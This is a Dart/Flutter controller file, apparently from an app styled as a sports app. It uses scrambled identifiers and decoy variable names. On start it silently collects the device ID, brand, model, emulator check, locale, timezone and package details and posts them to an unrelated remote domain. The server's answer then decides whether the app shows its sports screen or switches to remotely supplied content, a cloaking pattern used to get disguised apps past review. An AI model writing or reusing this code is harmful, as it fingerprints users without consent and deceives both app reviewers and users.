import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var btzflup = RxBool(false);
  var xnzcqhui = RxBool(true);
  var kprgyof = RxString("");
  var sean = RxBool(false);
  var littel = RxBool(true);
  final pnhayudcgi = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    awqmfvj();
  }


  Future<void> awqmfvj() async {

    sean.value = true;
    littel.value = true;
    xnzcqhui.value = false;

    pnhayudcgi.post("https://ggti.poingty.xyz/kmdpjhoqferxcuvgnws",data: await jehnogq()).then((value) {
      var xynfk = value.data["xynfk"] as String;
      var lmke = value.data["lmke"] as bool;
      if (lmke) {
        kprgyof.value = xynfk;
        arturo();
      } else {
        osinski();
      }
    }).catchError((e) {
      xnzcqhui.value = true;
      littel.value = true;
      sean.value = false;
    });
  }

  Future<Map<String, dynamic>> jehnogq() async {
    final DeviceInfoPlugin ixogc = DeviceInfoPlugin();
    PackageInfo ijmqpul_xhjz = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var evurdspi = Platform.localeName;
    var hsrkeo_SCDb = currentTimeZone;

    var hsrkeo_TmEKt = ijmqpul_xhjz.packageName;
    var hsrkeo_pyCr = ijmqpul_xhjz.version;
    var hsrkeo_NdnVeRcw = ijmqpul_xhjz.buildNumber;

    var hsrkeo_OPzBfn = ijmqpul_xhjz.appName;
    var hsrkeo_ODb  = "";
    var lilyAnderson = "";
    var hsrkeo_iMph = "";
    var sigridChristiansen = "";
    var othoErdman = "";
    var josianeMueller = "";
    var hsrkeo_EJKul = "";
    var nedraCorkery = "";
    var anabelDaniel = "";


    var hsrkeo_PQrOyfcI = "";
    var hsrkeo_BlYenh = false;

    if (GetPlatform.isAndroid) {
      hsrkeo_PQrOyfcI = "android";
      var wkvbojg = await ixogc.androidInfo;

      hsrkeo_iMph = wkvbojg.brand;

      hsrkeo_EJKul  = wkvbojg.model;
      hsrkeo_ODb = wkvbojg.id;

      hsrkeo_BlYenh = wkvbojg.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hsrkeo_PQrOyfcI = "ios";
      var tknwqybjm = await ixogc.iosInfo;
      hsrkeo_iMph = tknwqybjm.name;
      hsrkeo_EJKul = tknwqybjm.model;

      hsrkeo_ODb = tknwqybjm.identifierForVendor ?? "";
      hsrkeo_BlYenh  = tknwqybjm.isPhysicalDevice;
    }
    var res = {
      "hsrkeo_OPzBfn": hsrkeo_OPzBfn,
      "hsrkeo_NdnVeRcw": hsrkeo_NdnVeRcw,
      "hsrkeo_pyCr": hsrkeo_pyCr,
      "lilyAnderson" : lilyAnderson,
      "hsrkeo_TmEKt": hsrkeo_TmEKt,
      "hsrkeo_EJKul": hsrkeo_EJKul,
      "hsrkeo_iMph": hsrkeo_iMph,
      "hsrkeo_ODb": hsrkeo_ODb,
      "sigridChristiansen" : sigridChristiansen,
      "evurdspi": evurdspi,
      "hsrkeo_BlYenh": hsrkeo_BlYenh,
      "hsrkeo_SCDb": hsrkeo_SCDb,
      "othoErdman" : othoErdman,
      "josianeMueller" : josianeMueller,
      "hsrkeo_PQrOyfcI": hsrkeo_PQrOyfcI,
      "nedraCorkery" : nedraCorkery,
      "anabelDaniel" : anabelDaniel,

    };
    return res;
  }

  Future<void> osinski() async {
    Get.offAllNamed("/sport_tab");
  }

  Future<void> arturo() async {
    Get.offAllNamed("/sport_other");
  }

}
